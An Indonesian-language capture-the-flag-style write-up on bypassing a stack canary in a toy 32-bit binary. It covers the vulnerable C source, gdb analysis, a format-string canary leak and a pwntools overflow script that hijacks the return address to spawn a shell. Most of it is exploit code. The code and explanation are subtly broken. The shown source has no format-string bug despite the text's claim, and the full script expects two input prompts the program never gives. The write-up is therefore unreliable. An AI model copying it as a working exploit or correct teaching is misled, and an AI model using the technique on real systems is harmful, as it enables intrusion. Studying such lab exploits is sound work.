---
title: Bypassing Stack Canaries (Leak + Write) - Pwn03.1
date: 2025-08-20
Tags: ["Pwn"]
---

## 1. Basic File Checks

Lakukan pemeriksaan awal pada biner:

```bash
# Compile dengan stack canary
gcc -m32 -fstack-protector-all bof4.c -o bof4

# Periksa properti file
file bof4
checksec bof4
```

**Output:**
```
bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

[*] '/home/user/bof4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

**Kesimpulan:** Biner 32-bit dengan proteksi **Stack Canary** dan **NX Enabled**, namun tanpa PIE (alamat fungsi statis).

## 2. Review Source Code

**bof4.c:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win() {
    printf("Congrats, you bypassed the canary!\n");
    system("/bin/sh");
}

void vuln() {
    char buf[64];
    puts("Level 4: Canary is enabled. Can you bypass it?");
    printf("Input: ");
    fgets(buf, 256, stdin);  // VULNERABILITY: Buffer overflow!
    printf("You said: %s\n", buf); // VULNERABILITY: Format string
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("Exiting...");
    return 0;
}
```

**Vulnerabilities:**
1. **Buffer Overflow:** `fgets` membaca 256 byte ke buffer 64 byte.
2. **Format String:** `printf(buf)` memungkinkan leak data dari stack.

**Target:** Eksploitasi untuk menjalankan fungsi `win()`.

## 3. Analisis Assembly dengan pwndbg

Breakdown fungsi `vuln`:

```bash
gdb ./bof4
disass vuln
```

**Output Penting:**
```
   0x080491d4 <+18>:    mov    eax,gs:0x14        ; Load canary dari TLS
   0x080491da <+24>:    mov    DWORD PTR [ebp-0xc],eax ; Simpan canary di [ebp-0xc]
   ...
   0x08049218 <+86>:    call   0x8049060 <fgets@plt> ; fgets(buf, 256, stdin)
   ...
   0x08049233 <+113>:   xor    eax,DWORD PTR gs:0x14 ; Verifikasi canary
   0x0804923a <+120>:   je     0x8049241 <vuln+127>   ; Jika valid, lanjutkan
   0x0804923c <+122>:   call   0x80490a0 <__stack_chk_fail_local> ; Jika corrupt, abort
```

**Layout Stack di `vuln()`:**
| Alamat Relatif | Konten          | Ukuran |
|----------------|-----------------|--------|
| `ebp - 0x4c`   | `buf[64]`       | 64 byte|
| `ebp - 0x0c`   | **Canary**      | 4 byte |
| `ebp + 0x00`   | Saved EBP       | 4 byte |
| `ebp + 0x04`   | Return Address  | 4 byte |

**Offset Penting:**
- Start buffer ke canary: **64 byte**
- Start buffer ke return address: 64 + 4 (canary) + 4 (saved ebp) = **72 byte**

## 4. Strategi Exploit: Canary Leak & Bypass

Langkah-langkah:
1. **Leak Canary:** Manfaatkan format string `printf(buf)` untuk membaca nilai canary dari stack.
2. **Bypass Check:** Gunakan nilai canary yang telah dileak pada payload overflow agar check dapat passed.
3. **Hijack EIP:** Timpa return address dengan alamat fungsi `win`.

## 5. Langkah 1: Leak Canary via Format String

Canary disimpan di stack. Kita gunakan format specifier `%p` atau `$p` untuk membacanya.

**Fuzzing Posisi Canary:**
```python
#!/usr/bin/env python3
from pwn import *

context.binary = './bof4'
p = process('./bof4')

# Kirim payload fuzz
payload = b''
for i in range(1, 20):
    payload += f'%{i}$08p '.encode()  # %[pos]$p

p.sendline(payload)
response = p.clean()
print(response.decode())
p.close()
```

**Contoh Output:**
```
You said: 0xffffd5cc 0x00000064 0xf7f9c580 0xffffffff ... 0x5c9e1a00 ... 0xf7de4c8d
```
Cari nilai yang **berakhiran `0x00`** (null byte), seperti `0x5c9e1a00`. Itu adalah canary. Misalnya ditemukan di posisi ke-13.

**Script Leak Canary:**
```python
p.recvuntil(b"Input: ")
payload = b'%13$p'  # Langsung ambil dari posisi yang diduga
p.sendline(payload)

# Parse output
leaked_line = p.recvuntil(b"You said:").split(b'\n')[-2]  # Ambil baris sebelum "You said:"
canary = int(leaked_line, 16)  # Konversi string hex ke integer
log.info(f"Leaked canary: {hex(canary)}")
```

## 6. Langkah 2 & 3: Bangun Payload dan Hijack Control Flow

Setelah canary diketahui, bangun payload overflow yang mempertahankan nilainya.

```python
# Offset
offset_to_canary = 64
offset_to_ret = offset_to_canary + 4 + 4  # +4 (canary) +4 (saved ebp)

# Alamat win (dapat dari gdb: p win, atau objdump -t bof4 | grep win)
win_addr = 0x80491a6

# Bangun payload
payload = b'A' * offset_to_canary   # Isi buffer
payload += p32(canary)              # Timpa canary dengan nilai yang benar
payload += b'B' * 4                 # Timpa Saved EBP (bisa junk data)
payload += p32(win_addr)            # Timpa Return Address

p.sendline(payload)
p.interactive() # Enjoy your shell!
```

## 7. Full Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './bof4'
context.log_level = 'info'

p = process('./bof4')

# [1] LEAK CANARY
p.recvuntil(b"Input: ")
p.sendline(b'%13$p')  # Ganti 13 dengan posisi canary yang sesuai

leak = p.recvuntil(b"You said:").split(b'\n')[-2]
canary = int(leak, 16)
log.success(f"Canary leaked: {hex(canary)}")

# [2] BUILD OVERFLOW PAYLOAD
p.recvuntil(b"Input: ")

offset = 64
win_addr = 0x80491a6

payload = flat({
    offset: p32(canary),  # Letakkan canary yang benar di offset 64
    72: p32(win_addr)     # Letakkan alamat win di offset 72
})

p.sendline(payload)

# [3] GET SHELL
p.interactive()
```

**Penjelasan `flat()`:**  
Fungsi `flat` dari pwntools secara pintar mengatur payload.
- `{64: p32(canary)}` artinya di offset ke-64, tulis nilai canary.
- `{72: p32(win_addr)}` artinya di offset ke-72, tulis alamat `win`.
- Area antara 64-72 (yaitu saved EBP) otomatis diisi junk data.

**Eksekusi:**
```bash
$ python3 exploit.py
[+] Canary leaked: 0x5c9e1a00
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$
```
